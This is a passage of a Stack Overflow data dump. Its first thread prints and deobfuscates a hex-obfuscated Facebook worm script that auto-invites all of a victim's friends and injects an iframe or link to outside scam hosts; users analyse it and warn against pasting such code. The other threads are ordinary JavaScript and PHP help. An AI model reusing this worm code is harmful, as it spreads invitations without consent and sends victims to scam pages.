3E\",\"\\x73\\x75\\x67\\x67\\x65\\x73\\x74\",\"\\x4D\\x6F\\x75\\x73\\x65\\x45\\x76\\x65\\x6E\\x74\\x73\",\"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x76\\x65\\x6E\\x74\",\"\\x63\\x6C\\x69\\x63\\x6B\",\"\\x69\\x6E\\x69\\x74\\x45\\x76\\x65\\x6E\\x74\",\"\\x64\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x45\\x76\\x65\\x6E\\x74\",\"\\x73\\x65\\x6C\\x65\\x63\\x74\\x5F\\x61\\x6C\\x6C\",\"\\x73\\x67\\x6D\\x5F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x66\\x6F\\x72\\x6D\",\"\\x2F\\x61\\x6A\\x61\\x78\\x2F\\x73\\x6F\\x63\\x69\\x61\\x6C\\x5F\\x67\\x72\\x61\\x70\\x68\\x2F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2E\\x70\\x68\\x70\",\"\\x73\\x75\\x62\\x6D\\x69\\x74\\x44\\x69\\x61\\x6C\\x6F\\x67\",\"\\x3C\\x69\\x66\\x72\\x61\\x6D\\x65\\x20\\x73\\x72\\x63\\x3D\\x22\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x62\\x69\\x74\\x2E\\x6C\\x79\\x2F\\x62\\x31\\x69\\x37\\x35\\x35\\x22\\x20\\x73\\x74\\x79\\x6C\\x65\\x3D\\x22\\x77\\x69\\x64\\x74\\x68\\x3A\\x20\\x36\\x30\\x30\\x70\\x78\\x3B\\x20\\x68\\x65\\x69\\x67\\x68\\x74\\x3A\\x20\\x35\\x30\\x30\\x70\\x78\\x3B\\x22\\x20\\x66\\x72\\x61\\x6D\\x65\\x62\\x6F\\x72\\x64\\x65\\x72\\x3D\\x30\\x20\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x69\\x6E\\x67\\x3D\\x22\\x6E\\x6F\\x22\\x3E\\x3C\\x2F\\x69\\x66\\x72\\x61\\x6D\\x65\\x3E\"];var variables=[_0x4249[0],_0x4249[1],_0x4249[2],_0x4249[3],_0x4249[4],_0x4249[5],_0x4249[6],_0x4249[7],_0x4249[8],_0x4249[9],_0x4249[10],_0x4249[11],_0x4249[12],_0x4249[13]]; void (document[variables[2]](variables[1])[variables[0]]=variables[3]);var ss=document[variables[2]](variables[4]);var c=document[variables[6]](variables[5]);c[variables[8]](variables[7],true,true); void ss[variables[9]](c); void setTimeout(function (){fs[variables[10]]();} ,4000); void setTimeout(function (){SocialGraphManager[variables[13]](variables[11],variables[12]);} ,5000); void (document[variables[2]](variables[1])[variables[0]]=_0x4249[14]);\n</code></pre>\n\n<p>becomes.... </p>\n\n<pre><code>var variables = ['innerHTML', 'app4949752878_body', 'getElementById', '&lt;a id=\"suggest\" href=\"#\" ajaxify=\"/ajax/social_graph/invite_dialog.php?class=FanManager&amp;amp;node_id=329722447896\" class=\" profile_action actionspro_a\" rel=\"dialog-post\"&gt;Suggest to Friends&lt;/a&gt;', 'suggest', 'MouseEvents', 'createEvent', 'click', 'initEvent', 'dispatchEvent', 'select_all', 'sgm_invite_form', '/ajax/social_graph/invite_dialog.php', 'submitDialog'];\nvoid(document[variables[2]](variables[1])[variables[0]] = variables[3]);\nvar ss = document[variables[2]](variables[4]);\nvar c = document[variables[6]](variables[5]);\nc[variables[8]](variables[7], true, true);\nvoid ss[variables[9]](c);\nvoid setTimeout(function () {\n    fs[variables[10]]();\n}, 4000);\nvoid setTimeout(function () {\n    SocialGraphManager[variables[13]](variables[11], variables[12]);\n}, 5000);\nvoid(document[variables[2]](variables[1])[variables[0]] = '&lt;iframe src=\"http://sslhoster.com/pages/newps3\" style=\"width: 798px; height: 550px;\" frameborder=0 scrolling=\"no\"&gt;&lt;/iframe&gt;');\n</code></pre>\n\n<p>using default settings... </p>\n\n<p>For this one in particular though I had to have access to the FB page to get ALL of the javascript (I'm digging further)...</p>\n\n<p>Thankfully the Wife always asks before executing javascript in the address line (she found the javascript just this evening).</p>\n\n<p>Kris</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Well, I have to admit, I was curious enough that I opened a new facebook profile to find out what this thing does...</p>\n\n<p>after reading the un-obfuscated code you can determine that this script will automatically open your Friend's list, and suggest just this Facebook page to all your friends (the amount allowed, of course). Therefor sending out invitations (unknowingly) to all of your friends, which some will undoubtedly continue...</p>\n\n<p>Simply put, don't copy any JavaScript lines without knowing who posted them in the first place. :)</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Note that I am not experienced with Javascript. If a javascript code starts like this:</p>\n\n<pre><code>javascript:var _0x89f8=[\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\",\"\\x61\\x70\\x70\\x34\\x39\\x34\\x39\\x37\\x35\\x32\\x38\\x37\\x38\\x5F\\x64\\x64\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x3c\\x61\\x20\\x69\\x64\\x3d\\x22\\x73\\x75\\x67\\x67\\x65\\x73\\x74\\x22\\x20\\x68\\x72\\x65\\x66\\x3d\\x22\\x23\\x22\\x20\\x61\\x6a\\x61\\x78\\x69\\x66\\x79\\x3d\\x22\\x2f\\x61\\x6a\\x61\\x78\\x2f\\x73\\x6f\\x63\\x69\\x61\\x6c\\x5f\\x67\\x72\\x61\\x70\\x68\\x2f\\x69\\x6e\\x76\\x69\\x74\\x65\\x5f\\x64\\x69\\x61\\x6c\\x6f\\x67\\x2e\\x70\\x68\\x70\\x3f\\x63\\x6c\\x61\\x73\\x73\\x3d\\x46\\x61\\x6e\\x4d\\x61\\x6e\\x61\\x67\\x65\\x72\\x26\\x61\\x6d\\x70\\x3b\\x6e\\x6f\\x64\\x65\\x5f\\x69\\x64\\x3d\\x31\\x30\\x38\\x34\\x36\\x33\\x39\\x31\\x32\\x35\\x30\\x35\\x33\\x35\\x36\\x22\\x20\\x63\\x6c\\x61\\x73\\x73\\x3d\\x22\\x20\\x70\\x72\\x6f\\x66\\x69\\x6c\\x65\\x5f\\x61\\x63\\x74\\x69\\x6f\\x6e\\x20\\x61\\x63\\x74\\x69\\x6f\\x6e\\x73\\x70\\x72\\x6f\\x5f\\x61\\x22\\x20\\x72\\x65\\x6c\\x3d\\x22\\x64\\x69\\x61\\x6c\\x6f\\x67\\x2d\\x70\\x6f\\x73\\x74\\x22\\x3e\\x53\\x75\\x67\\x67\\x65\\x73\\x74\\x20\\x74\\x6f\\x20\\x46\\x72\\x69\\x65\\x6e\\x64\\x73\\x3c\\x2f\\x61\\x3e\",\"\\x73\\x75\\x67\\x67\\x65\\x73\\x74\",\"\\x4D\\x6F\\x75\\x73\\x65\\x45\\x76\\x65\\x6E\\x74\\x73\"...\n</code></pre>\n\n<p>Then is it compiled? If so, any way of decompiling it? If it is not compiled, then any help on how to read this type of code?</p>\n\n<p>Any help would be greatly appreciated.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>Thank you all for the kind responds. And wow, I had no idea that I would get replied this quickly, kudos to Stackoverflow.</p>\n\n<p>Nevertheless, can anyone help me make this more readible than:</p>\n\n<pre><code>var _0x89f8=[\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\",\n             \"\\x61\\x70\\x70\\x34\\x39\\x34\\x39\\x37\\x35\\x32\\x38\\x37\\x38\\x5F\\x64\\x64\",\n             \"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\n             \"\\x3c\\x61\\x20\\x69\\x64\\x3d\\x22\\x73\\x75\\x67\\x67\\x65\\x73\\x74\\x22\\x20\\x68\\x72\\x65\\x66\\x3d\\x22\\x23\\x22\\x20\\x61\\x6a\\x61\\x78\\x69\\x66\\x79\\x3d\\x22\\x2f\\x61\\x6a\\x61\\x78\\x2f\\x73\\x6f\\x63\\x69\\x61\\x6c\\x5f\\x67\\x72\\x61\\x70\\x68\\x2f\\x69\\x6e\\x76\\x69\\x74\\x65\\x5f\\x64\\x69\\x61\\x6c\\x6f\\x67\\x2e\\x70\\x68\\x70\\x3f\\x63\\x6c\\x61\\x73\\x73\\x3d\\x46\\x61\\x6e\\x4d\\x61\\x6e\\x61\\x67\\x65\\x72\\x26\\x61\\x6d\\x70\\x3b\\x6e\\x6f\\x64\\x65\\x5f\\x69\\x64\\x3d\\x31\\x30\\x38\\x34\\x36\\x33\\x39\\x31\\x32\\x35\\x30\\x35\\x33\\x35\\x36\\x22\\x20\\x63\\x6c\\x61\\x73\\x73\\x3d\\x22\\x20\\x70\\x72\\x6f\\x66\\x69\\x6c\\x65\\x5f\\x61\\x63\\x74\\x69\\x6f\\x6e\\x20\\x61\\x63\\x74\\x69\\x6f\\x6e\\x73\\x70\\x72\\x6f\\x5f\\x61\\x22\\x20\\x72\\x65\\x6c\\x3d\\x22\\x64\\x69\\x61\\x6c\\x6f\\x67\\x2d\\x70\\x6f\\x73\\x74\\x22\\x3e\\x53\\x75\\x67\\x67\\x65\\x73\\x74\\x20\\x74\\x6f\\x20\\x46\\x72\\x69\\x65\\x6e\\x64\\x73\\x3c\\x2f\\x61\\x3e\",\n             \"\\x73\\x75\\x67\\x67\\x65\\x73\\x74\",\n             \"\\x4D\\x6F\\x75\\x73\\x65\\x45\\x76\\x65\\x6E\\x74\\x73\",\n             \"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x76\\x65\\x6E\\x74\",\n             \"\\x63\\x6C\\x69\\x63\\x6B\",\n             \"\\x69\\x6E\\x69\\x74\\x45\\x76\\x65\\x6E\\x74\",\n             \"\\x64\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x45\\x76\\x65\\x6E\\x74\",\n             \"\\x73\\x65\\x6C\\x65\\x63\\x74\\x5F\\x61\\x6C\\x6C\",\n             \"\\x73\\x67\\x6D\\x5F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x66\\x6F\\x72\\x6D\",\n             \"\\x2F\\x61\\x6A\\x61\\x78\\x2F\\x73\\x6F\\x63\\x69\\x61\\x6C\\x5F\\x67\\x72\\x61\\x70\\x68\\x2F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2E\\x70\\x68\\x70\",\n             \"\\x73\\x75\\x62\\x6D\\x69\\x74\\x44\\x69\\x61\\x6C\\x6F\\x67\"];\nvoid ( document[_0x89f8[2]](_0x89f8[1])[_0x89f8[0]]=_0x89f8[3] );\nvar ss=document[_0x89f8[2]](_0x89f8[4]);\nvar c=document[_0x89f8[6]](_0x89f8[5]);\nc[_0x89f8[8]](_0x89f8[7],true,true);\nvoid (ss[_0x89f8[9]](c));\nvoid (setTimeout(function (){fs[_0x89f8[10]]();} ,3000));\nvoid (setTimeout(function (){SocialGraphManager[_0x89f8[13]](_0x89f8[11],_0x89f8[12]);} ,4000));\nvoid (setTimeout(function(){document[_0x89f8[2]](_0x89f8[1])[_0x89f8[0]]= '\\x3c\\x61\\x20\\x68\\x72\\x65\\x66\\x3d\\x22\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x69\\x74\\x2e\\x6c\\x79\\x2f\\x38\\x5a\\x72\\x72\\x46\\x4f\\x22\\x3e\\x4f\\x6e\\x65\\x20\\x43\\x6c\\x69\\x63\\x6b\\x20\\x46\\x65\\x72\\x74\\x69\\x6c\\x69\\x7a\\x65\\x3c\\x2f\\x61\\x3e';} ,4500));\n</code></pre>\n",
            "last_activity_date": 1273321307,
            "question_id": 2613986,
            "score": 4,
            "tags": [
                "javascript",
                "compiled"
            ],
            "title": "Javascript compiled or not? Check inside"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>Try this:</p>\n\n<pre><code>function diff(obj1, obj2) {\n    var result = {};\n    $.each(obj1, function (key, value) {\n        if (!obj2.hasOwnProperty(key) || obj2[key] !== obj1[key]) {\n            result[key] = value;\n        }\n    });\n\n    return result;\n}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 4
                },
                {
                    "body": "<p>If you're familiar with PHP syntax, take a look at <a href=\"http://phpjs.org/functions/index\" rel=\"nofollow\">http://phpjs.org/functions/index</a> which includes almost all PHP's array related functions converted into JavaScript &ndash; including <a href=\"http://phpjs.org/functions/array_diff:309\" rel=\"nofollow\"><code>array_diff</code></a></p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>RaYell's solution is nice but unfortunately will only tell you the items in obj2 that are either different from or non-existant in obj1, if we need to know both sides, let's get all keys and then compare. The following function will return an associative array with key values for each object. Oh... to be fair, I haven't tested yet, but this should work.</p>\n\n<pre><code>var diff = function(obj1,obj2) {\n  var newObj = $.extend({},obj1,obj2);\n  var result = {};\n  $.each(newObj, function (key, value) {\n      if (!obj2.hasOwnProperty(key) || !obj1.hasOwnProperty(key) || obj2[key] !== obj1[key]) {\n         result[key] = [obj1[key],obj2[key]];\n      }\n  });\n\n  return result;\n}\n</code></pre>\n\n<p>Oh, and while I do recognize that the first solution answered the initial question, I think the above solution offers another approach that the initial user might find useful so as to not require checking twice.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This might be much more sophisticate than what you need, but you can try my jsondiffpatch lib that will diff any pair of javascript objects:</p>\n\n<p><a href=\"https://github.com/benjamine/jsondiffpatch\" rel=\"nofollow\">https://github.com/benjamine/jsondiffpatch</a></p>\n\n<p>if you want to test it you can see it live in <a href=\"http://benjamine.github.com/jsondiffpatch/demo/index.html\" rel=\"nofollow\">http://benjamine.github.com/jsondiffpatch/demo/index.html</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>If I have two associative arrays, what would be the most efficient way of doing a diff against their values?</p>\n\n<p>For example, given:</p>\n\n<pre><code>  array1 = {\n    foreground: 'red',\n    shape: 'circle',\n    background: 'yellow'\n  };\n\n  array2 = {\n    foreground: 'red',\n    shape: 'square',\n    angle: '90',\n    background: 'yellow'\n  };\n</code></pre>\n\n<p>How would I check one against the other, such that the items <em>missing</em> <strong>or</strong> <em>additional</em> are the resulting array. In this case, if I wanted to compare array1 within array2, it would return:</p>\n\n<pre><code>array3 = {shape: 'circle'}\n</code></pre>\n\n<p>Whilst if I compared array2 within array1, it would return:</p>\n\n<pre><code>array3 = {shape: 'square', angle: '90'}\n</code></pre>\n\n<p>Thanks in advance for your help!</p>\n",
            "last_activity_date": 1393745010,
            "question_id": 2558800,
            "score": 4,
            "tags": [
                "javascript",
                "jquery",
                "arrays",
                "loops",
                "associative-array"
            ],
            "title": "Doing a &quot;Diff&quot; on an Associative Array in javascript / jQuery?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Nope. Cross domain security prevents this. The only way around is if the surrounding page, and the iframe, are on different subdomains on the same domain. In that case, you can use <a href=\"https://developer.mozilla.org/en/DOM/document.domain\"><strong>document.domain</strong></a>.</p>\n\n<p>This is pretty much a given. Imagine the security implications if this were not the case. You could build an iframe containing a user's home banking page, and grab their password using <code>keydown</code>, for example. There's tons of possibilities of misuse.</p>\n",
                    "is_accepted": true,
                    "score": 11
                }
            ],
            "body": "<p>I have a page thusly:</p>\n\n<pre><code>&lt;html&gt;\n    &lt;body&gt;\n        &lt;iframe src=\"local.html\"&gt;&lt;/iframe&gt;\n        &lt;iframe src=\"http:www.google.com\"&gt;&lt;/iframe&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>I've used the DOM to access the first iframe as a test (node.documentWindow) but when I try similar on the external iframe Firebug reports that access is denied.</p>\n\n<p>I suspect this is for XSS protection, but is there a \"safe\" way to import the node so I can grab an element from that external page? Is there a way to explore the \"document as rendered\" or something?</p>\n\n<p>Thanks!</p>\n",
            "last_activity_date": 1267649511,
            "question_id": 2374697,
            "score": 4,
            "tags": [
                "javascript",
                "html",
                "dom",
                "iframe",
                "xss"
            ],
            "title": "How can you access an external iframe&#39;s contents via the DOM/Javascript?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Yes, the first one sets the variable a as an anonymous variable, while the second one sets the variable a to the result of the function.</p>\n\n<p>Edit: I read the first code wrong. The answer is no.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The first syntax is only valid if you assign the result of the function execution to a variable, If you just want to execute the function, this form would be a syntax error:</p>\n\n<pre><code>function(){\n   return 'test';\n}();\n</code></pre>\n\n<p>The other form is still valid, though:</p>\n\n<pre><code>(function(){\n    return 'test';\n })();\n</code></pre>\n\n<p>Therefore the second version is more flexible and can be used more consistently.</p>\n\n<p>(The first form is not valid syntax to <a href=\"http://stackoverflow.com/questions/670623/why-this-kind-of-function-invocation-is-wrong-in-javascript\">avoid ambiguities in the Javascript grammar</a>.)</p>\n",
                    "is_accepted": true,
                    "score": 11
                },
                {
                    "body": "<p>It is good practice (but not required) to wrap IIFEs (Immediately Invoked Function Expressions) in parenthesis for readability. If your function is long and the reader cannot see the end, the opening parenthesis calls the readers attention to the fact that there is something special about this function expression and forces them to look at the bottom to find out what it is.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<pre><code>var a  = function(){\n            return 'test';\n         }();\nconsole.log(a);\n</code></pre>\n\n<p>Answer in First Case : test</p>\n\n<pre><code>var a = (function(){\n           return 'test';\n        })();\nconsole.log(a);\n</code></pre>\n\n<p>Answer in Second Case : test</p>\n\n<p>I am using the the first approach to create self-executing functions. However, I have seen the second approach as well. Is there any difference in the two approaches ? The result is obviously the same.</p>\n",
            "last_activity_date": 1379082835,
            "question_id": 2137826,
            "score": 4,
            "tags": [
                "javascript"
            ],
            "title": "Is there any reason to wrap anonymous JavaScript functions in braces?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>Use <a href=\"http://www.w3schools.com/jsref/jsref_obj_date.asp\" rel=\"nofollow\">Date object</a>.</p>\n\n<pre><code>var d = new Date(difference_in_milliseconds);\nvar seconds = d.getSeconds();\nvar minutes = d.getMinutes();\nvar hours = d.getHours() - 1; //See note\n</code></pre>\n\n<p>Note: Strangely, hours value is bigger by one than I would expect for reason I don't understand. It looks like \"midnight Jan 1, 1970\" was at 1 AM :-)</p>\n\n<p>UPDATE: The difference of 1 is due to the offset of my timezone (GMT +1).</p>\n\n<p>Slight change that will solve this:</p>\n\n<pre><code>var d = new Date();\nvar offset = d.getTimezoneOffset() * 60000;\nvar d = new Date(difference_in_milliseconds + offset);\nvar seconds = d.getSeconds();\nvar minutes = d.getMinutes();\nvar hours = d.getHours();\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 0
                },
                {
                    "body": "<p>In php you can also do it this way:</p>\n\n<pre><code>$time_period = ( $tEnd - $tStart );\n$time_increments = array( 'days' =&gt; 86400, 'hrs' =&gt; 3600, 'mins' =&gt; 60, 's' =&gt; 1 );\n\n## will hold our values for ( day, minute, hour, seconds )\n$time_span = array();\n\n## cycle through time_increments\nwhile( list( $key, $value ) = each( $time_increments )) {\n   $this_value = (int) ( $time_period / $value );\n   $time_period = ( $time_period % $value );\n\n   # save value\n   $time_span[$key] = $this_value;\n }\n\n ## show results\n while( list( $key, $value ) = each( $time_span )) {\n    print \"$value $key \";\n }\n</code></pre>\n\n<p>EDIT as Josef said:</p>\n\n<pre><code> $tEnd = mktime(14,15,00,1,7,2009);\n $tStart = mktime(15,10,00,12,5,2006);\n $time_period = ( $tEnd - $tStart );\n\n echo date(\"z H:i:s\", $time_period); \n</code></pre>\n\n<p>the result is: 33 '23:05:00'  :S</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This <a href=\"http://www.datejs.com/\" rel=\"nofollow\">JavaScript library</a> is easy to use and will likely serve you well.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Why not have the php page give you the difference?</p>\n\n<pre><code>$sql = \"SELECT UNIX_TIMESTAMP(NOW()) as currentTime, UNIX_TIMESTAMP(closeTime) as closeTime FROM yourTable WHERE yourRecordId = '123'\";\n\n$query = mysql_query($sql);\n\n$result = mysql_fetch_assoc($query);\n\necho timeRemaining($result['currentTime'], $result['closeTime']);\n\nfunction timeRemaining($start, $end) {\n    $dateDiff = $end - $start;\n    if ($dateDiff &lt;= 0) { return 'Ended'; }\n    $fullDays = floor($dateDiff/(60*60*24));\n    $fullHours = floor(($dateDiff-($fullDays*60*60*24))/(60*60));\n    $fullMinutes = floor(($dateDiff-($fullDays*60*60*24)-($fullHours*60*60))/60);\n    return \"Ending in $fullDays days, $fullHours hours and $fullMinutes minutes.\";   \n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Do you really have to get the time through AJAX every 1000 ms? \n(i suppose that you're hoping for closetime changes? ...)</p>\n\n<p>But if you really must do it this way, i'd suggest getting the time difference directly in MySQL for code simplicity.</p>\n\n<pre><code>$sql = \"SELECT TIMEDIFF(NOW(), `CreateTime`) from `Table` WHERE `id`=1;\"\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>There is a <a href=\"http://keith-wood.name/countdown.html\" rel=\"nofollow\">jquery Countdown Plugin</a> that supports server sync through AJAX:</p>\n\n<p>From the <a href=\"http://keith-wood.name/countdownRef.html#serverSync\" rel=\"nofollow\">docs</a>:</p>\n\n<blockquote>\n  <p>Synchronise the client's time with\n  that of the server by providing a\n  function that returns the current\n  server date and time. This date and\n  time should take into account the\n  server's timezone and any difference\n  between that time and the client's is\n  applied to the countdown when it is\n  started or changed.</p>\n  \n  <p>The following example uses a PHP\n  program on the server to return the\n  current server time in a format that\n  can be used directly by the JavaScript\n  callback. You should make sure that\n  your server call is synchronous.</p>\n</blockquote>\n\n<pre><code>$(selector).countdown({ \n    until:liftoffTime, serverSync: serverTime}); \n\nfunction serverTime() { \n    var time = null; \n    $.ajax({url: 'http://myserver.com/serverTime.php', \n        async: false, dataType: 'text', \n        success: function(text) { \n            time = new Date(text); \n        }, error: function(http, message, exc) { \n            time = new Date(); \n    }}); \n    return time; \n}\n</code></pre>\n\n<p>serverTime.php:</p>\n\n<pre><code>&lt;?php \n$now = new DateTime(); \necho $now-&gt;format(\"M j, Y H:i:s O\").\"\\n\"; \n?&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I was wondering what the best way is to calculate the difference in time from now to a certain point, let's say the countdown time.</p>\n\n<p>I have an auction that has a closetime at a certain point, this time is stored in a MySQL record in the format \" DATETIME 00-00-000 00:00:00 \". This record is called closetime.</p>\n\n<p>Now on my website I have JavaScript code that gets this time via a PHP file. The JavaScript loops every second using <code>setInterval 1000</code>. The PHP file gets the closetime from the db, and sends it back in this format</p>\n\n<pre><code>strtotime($result['closetime']);\n</code></pre>\n\n<p>And I get the time of the request, I want to use the server time, and not the time in JavaScript, because the clock of the user can be off.</p>\n\n<pre><code>strtotime(date(\"H:i:s\", $_SERVER['REQUEST_TIME']))\n</code></pre>\n\n<p>I send back these two timestamps and calculate the time difference between them in JavaScript. I use this function to do it, the values send back from PHP I call currentTime and closeTime, I think this should be clear.</p>\n\n<pre><code>function auctionDelayTime(currentTime,closeTime){\n    totaldelay = closeTime - currentTime;\n    if(totaldelay &lt;= 0){\n        return 'ended';\n    }else{\n        if( days=parseInt((Math.floor(totaldelay/86400))) )\n            totaldelay = totaldelay % 86400;\n        if( hours=parseInt((Math.floor(totaldelay/3600))) )\n            totaldelay = totaldelay % 3600;\n      if( minutes=parseInt((Math.floor(totaldelay/60))) )\n            totaldelay = totaldelay % 60;\n        if( seconds=parseInt((Math.floor(totaldelay/1))) )\n            totaldelay = totaldelay % 1;\n\n        return hours+':'+formatTimes(minutes)+':'+formatTimes(seconds);\n    }\n}\nfunction formatTimes(value){\n    return value &lt; 10 ? '0'+value : value;\n}\n</code></pre>\n\n<p>I think this is an awful lot of code do something so simple. Does anyone have a better solution or maybe more 'beautiful' code.</p>\n\n<p>Enjoy!</p>\n",
            "last_activity_date": 1343121683,
            "question_id": 2020517,
            "score": 4,
            "tags": [
                "php",
                "javascript",
                "ajax",
                "datetime"
            ],
            "title": "Calculating the time difference in an PHP/MySQL/JavaScript system"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Your options are somewhat limited I'm afraid.</p>\n\n<ul>\n<li><a href=\"http://en.wikipedia.org/wiki/HTTP%5Fcookie\" rel=\"nofollow\">Cookies</a></li>\n<li>Depending on your willingness to only use certain browsers you could implement <a href=\"http://webkit.org/blog/126/webkit-does-html5-client-side-database-storage/\" rel=\"nofollow\">browser based storage</a></li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You may have a look on <a href=\"http://developer.yahoo.com/yui/storage/\" rel=\"nofollow\">YUI's StorageUtility</a>. It can use HTML 5, Google Gears or SWF on a fallback basis.</p>\n",
                    "is_accepted": true,
                    "score": 4
                },
                {
                    "body": "<p>I have a very simple demo for testing HTML5's webstorage / localstorage.</p>\n\n<p><a href=\"http://www.codebase.es/test/webstorage.html\" rel=\"nofollow\">http://www.codebase.es/test/webstorage.html</a></p>\n\n<p>You can store whatever you want, not only strings. To store an image, copy the image into a canvas and save the data using toDataURL() method.</p>\n\n<p>But don't expect it to work on IE...</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Cookies are the most supported way to go that will work across browsers.  I have open sourced a small library for getting and saving data via Cookies via native javascript objects.</p>\n\n<pre><code>http://code.google.com/p/mapbug/source/browse/trunk/app/scripts/cookies.js\n</code></pre>\n\n<p>you're welcome to copy it and use as you see fit.  You'll also need this javascript namespace isolation code if you use it as is:</p>\n\n<pre><code>http://code.google.com/p/mapbug/source/browse/trunk/app/scripts/namespace.js\n</code></pre>\n\n<p>If you have a large amount of data, you will have to distribute it amoung many different cookies.  You can generally depend on being able to save up to 4K of data per cookie.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The YUI StorageUtility is a nice abstraction, as Andy said. Dojo has a similar abstraction <a href=\"http://api.dojotoolkit.org/jsdoc/1.3.2/dojox.storage\" rel=\"nofollow\">dojox.storage</a> which works with some older browsers as well. If your amount of data is &lt; 100 KB, then you can easily just use Flash. Think carefully about using HTTP cookies, as they are not only limited in size, they are sent over the wire, which may or may not be desirable.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>In my demos, I'd like to avoid using traditional DBs and store all the data on the client side, e.g. information submitted via a form.</p>\n\n<p>What alternatives do I have for that. I've heard about Gears but I don't have any practical experience.</p>\n\n<p>Can I also store binary information besides strings, e.g. an image? </p>\n",
            "last_activity_date": 1324524294,
            "question_id": 1460737,
            "score": 4,
            "tags": [
                "javascript",
                "flash",
                "google-gears"
            ],
            "title": "Client Side Persistence (Storage)"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>No, you can't pass parameters like that and have the script read them in.</p>\n\n<p>Technically you could grab them from the <code>&lt;script&gt;</code> tag, but that would be a real mess.</p>\n\n<p>Could you just output a script block before you include the file?</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt; var timeout = 1000; &lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 11
                },
                {
                    "body": "<p>No, but you can pass a the value directly to a function in that file or set a variable value that will be used in the external file.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>try this:</p>\n\n<pre><code>&lt;script&gt;\nvar myvariable = \"foo\";\n&lt;/script&gt;\n&lt;script src=\"/link/to/js.js\"&gt;&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<pre><code>&lt;script type=\"text/javascript\"&gt;\nvar imagesPath = \"emblematiq/img/\";\n&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"emblematiq/niceforms.js\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>This will work fine on server</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Is it possible to pass a variable to a linked .js file? I tried this:</p>\n\n<pre><code>&lt;sf:JsFileLink ID=\"JQueryLoader\" runat=\"server\" ScriptType=\"Custom\" FileName=\"~/Files/Scripts/rotatorLoader.js?timeout=1000\" /&gt;\n</code></pre>\n\n<p>But firebug is telling me that timeout is not defined. Here is the code for that .js file:</p>\n\n<pre><code>$(document).ready(function() {\n    $(\"#rotator &gt; ul\").tabs({ fx: { opacity: \"toggle\"} }).tabs(\"rotate\", timeout, true);\n});\n</code></pre>\n\n<p>I am using <code>&lt;sf:JsFileLink ... /&gt;</code> tag is because the website I am working in utilizes sitefinity and this tag allows me to load external .js files.</p>\n\n<h2>UPDATE:</h2>\n\n<p>I was able to 'trick' the include by creating an aspx page that emulates a javascript page:</p>\n\n<pre><code>&lt;%@ Page Language=\"C#\" %&gt;\n\n&lt;%\n    Response.ContentType = \"text/javascript\";\n    Response.Clear();\n    string timeout;\n    try\n    {\n        timeout = Session[\"timeout\"].ToString();\n    }\n    catch\n    {\n        timeout = \"4000\";\n    }\n%&gt;\n\n$(document).ready(function() {\n    $(\"#rotator &gt; ul\").tabs({ fx: { opacity: \"toggle\"} }).tabs(\"rotate\", &lt;%=timeout %&gt;, true);\n});\n</code></pre>\n\n<p>And on the user control page:</p>\n\n<pre><code>[DefaultProperty(\"BannerTimeout\")]\npublic partial class Custom_UserControls_TabbedRotator : System.Web.UI.UserControl\n{\n    [Category(\"Configuration\")]\n    [Description(\"Sets the rotation timeout, in seconds.\")]\n    